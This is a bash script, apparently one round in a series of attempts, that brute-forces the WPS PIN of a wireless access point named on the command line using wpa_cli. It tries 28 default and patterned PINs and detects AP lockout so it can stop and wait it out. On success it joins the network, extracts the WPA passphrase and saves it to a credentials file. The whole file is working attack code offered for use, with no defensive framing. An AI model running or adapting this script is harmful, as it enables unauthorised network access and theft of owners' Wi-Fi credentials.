#!/bin/bash
# wps_try_r3.sh - WPS round 3: broader documented-default PINs + AP lockout detection.
# Rounds 1+2 (24 PINs) failed. Aborts if AP starts ignoring WPS (lockout).
# Run as root. wlan0 untouched. Usage: ./wps_try_r3.sh <BSSID> <SSID> <outdir>
set -u
BSSID="${1:?bssid}"; SSID="${2:?ssid}"; OUT="${3:-./results-wps3}"
CTRL=/run/wpa_supplicant_pwn
IF=wlan1
mkdir -p "$OUT"
PINS="00005672 04189699 08507716 12344321 12456789 23456789 34567890 45678901 56789012 67890123 78901234 89012345 90123456 01234567 10203040 11122233 12341234 12121212 13131313 23232323 45454545 56565656 78787878 89898989 00001111 11110000 24681357 13579246"
echo "[*] WPS PIN sweep round 3 vs $SSID ($BSSID), $(echo $PINS | wc -w) PINs" | tee "$OUT/wps.log"

before_ids() { wpa_cli -p $CTRL -i $IF list_networks 2>/dev/null | tail -n +2 | cut -f1 | tr '\n' ' '; }
cleanup_new() {
  for N in $(before_ids); do
    skip=0; for O in $1; do [ "$N" = "$O" ] && skip=1; done
    [ $skip -eq 0 ] && wpa_cli -p $CTRL -i $IF remove_network "$N" >/dev/null 2>&1
  done
  wpa_cli -p $CTRL -i $IF wps_cancel >/dev/null 2>&1
}
ignores=0
for PIN in $PINS; do
  OLD=$(before_ids)
  echo "[*] trying PIN $PIN ..." | tee -a "$OUT/wps.log"
  R=$(wpa_cli -p $CTRL -i $IF wps_pin "$BSSID" "$PIN" 2>&1)
  echo "    wps_pin -> $R" | tee -a "$OUT/wps.log"
  if echo "$R" | grep -qi fail; then echo "    (rejected locally, skipping)" | tee -a "$OUT/wps.log"; cleanup_new "$OLD"; continue; fi
  S=$(date +%s); DONE=0; NEGOTIATED=0
  while [ $(( $(date +%s) - S )) -lt 25 ]; do
    ST=$(wpa_cli -p $CTRL -i $IF status 2>/dev/null | grep ^wpa_state=)
    echo "    $ST" >>"$OUT/wps.log"
    if [ "$ST" = "wpa_state=COMPLETED" ]; then DONE=1; break; fi
    case "$ST" in
      wpa_state=ASSOCIATING|wpa_state=ASSOCIATED|wpa_state=4WAY_HANDSHAKE|wpa_state=GROUP_HANDSHAKE) NEGOTIATED=1;;
    esac
    sleep 2
  done
  if [ $DONE -eq 1 ]; then
    echo "[+] WPS SUCCESS PIN=$PIN" | tee -a "$OUT/wps.log"
    dhcpcd --timeout 8 $IF >/dev/null 2>&1; sleep 2
    IP=$(ip -4 -o addr show $IF 2>/dev/null | grep -oP 'inet \K\S+')
    NETID=$(wpa_cli -p $CTRL -i $IF list_networks 2>/dev/null | tail -1 | cut -f1)
    PSK=$(wpa_cli -p $CTRL -i $IF get_network "$NETID" psk 2>/dev/null)
    echo "$SSID:WPS-PIN-$PIN / PSK=$PSK / IP=$IP" | tee "$OUT/creds.txt"
    exit 0
  fi
  cleanup_new "$OLD"
  if [ $NEGOTIATED -eq 0 ]; then
    ignores=$((ignores+1))
    echo "[!] AP ignored WPS attempt ($ignores in a row) - possible lockout" | tee -a "$OUT/wps.log"
    [ $ignores -ge 3 ] && { echo "[STOP] AP appears WPS-locked. Waiting out lockout; do not retry for a while." | tee -a "$OUT/wps.log"; exit 2; }
  else
    ignores=0
    echo "[ ] PIN $PIN failed (AP negotiated, PIN wrong)" | tee -a "$OUT/wps.log"
  fi
done
echo "[DONE] WPS round 3 finished, no hit." | tee -a "$OUT/wps.log"
exit 1
